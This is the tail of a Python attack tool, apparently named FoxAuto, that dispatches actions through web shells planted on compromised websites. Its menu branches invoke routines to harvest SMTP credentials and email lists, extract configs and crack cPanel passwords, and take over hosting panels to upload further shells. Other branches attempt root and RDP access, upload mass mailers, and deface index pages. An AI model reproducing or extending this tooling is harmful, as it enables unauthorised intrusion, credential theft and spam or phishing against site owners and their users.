						getSMTP(shell_path)
					elif (w == 3) :
						finderScript(shell_path, url)
					elif (w == 4) :
						accesshash(shell_path, url)
					elif (w == 5) :
						getConfig(shell_path, url)
					elif (w == 6) :
						config = getConfig(shell_path, url)
						if (config is False):
							print('')
							continue
						else :
							getConfigPasswords_cPanelcracker(shell_path, config)
					elif (w == 7) :
						config = getConfig(shell_path, url)
						if (config is False):
							print('')
							continue
						else :
							logins = ChangePanel(shell_path, config)
							if (logins is False):
								print('')
								continue
							else :
								shells = uploadShellbyPanels(logins[0], logins[1], logins[2], logins[3], 0, srcShell, tyShell)
								if (q.lower() == 'y' or q.lower() == 'yes') :
									if (shells is False):
										print('')
										continue
									else :
										for shell in shells:
											try :
												print('   --| {}{}'.format(fc, URL_FOX(shell)))
												newShell = check(shell)
												resetPassword(newShell, '{}?php={}/_@files/php/up.txt'.format(newShell, dom), t)
												finderSMTP(newShell)
												getSMTP(newShell)
											except :
												print('   {}[-] Failed'.format(fr))
											print('')
					elif (w == 8) :
						getRoot(shell_path, url)
					elif (w == 9) :
						getRDP(shell_path, url)
					elif (w == 10) :
						getDomains(shell_path)
					elif (w == 11)  :
						getMails(shell_path)
					elif (w == 12) :
						config = getConfig(shell_path, url)
						if (config is False):
							print('')
							continue
						else :
							MassGetMails(shell_path, config)
					elif (w == 13) :
						uploadMailer(shell_path, srcMailer)
					elif (w == 14) :
						if (tyUP == 1):
							uploadFile(shell_path, srcShell, tyShell + 5)
						elif (tyUP == 2):
							uploadFileMain(shell_path, srcShell, tyShell + 5)
					elif (w == 15):
						if (tyUP == 1):
							massUploadIndex1(shell_path, fileSrc, nameF)
						elif (tyUP == 2):
							massUploadIndex2(shell_path, fileSrc)
					elif (w == 16) :
						ZIP(shell_path, filezip)
					elif (w == 17) :
						checkSend(shell_path, url)
					elif (w == 18) :
						if (tyReport == 1):
							ReportsShell_Auto(shell_path, url, unzipper)
						elif (tyReport == 2):
							ReportsShell_SemiAuto(shell_path, url, email, unzipper)
					elif (w == 20) :
						resetPassword(shell_path, url, t)
						finderSMTP(shell_path)
						getSMTP(shell_path)
					elif (w == 21) :
						resetPassword(shell_path, url, t)
						finderSMTP(shell_path)
						getSMTP(shell_path)
						accesshash(shell_path, url)
						getRoot(shell_path, url)
						config = getConfig(shell_path, url)
						if (config is False):
							print('')
							continue
						else :
							getConfigPasswords_cPanelcracker(shell_path, config)
					print('')
				else :
					print('   {}[-] Shell not Working OR Upload failed\n'.format(fr))
			except :
				print('   {}[-] Shell not Working OR Upload failed\n'.format(fr))
	except :
		pass

FoxAuto()
input_Fox('   {}[{}!{}] {}Press Enter to exit'.format(fw, fr, fw, fc))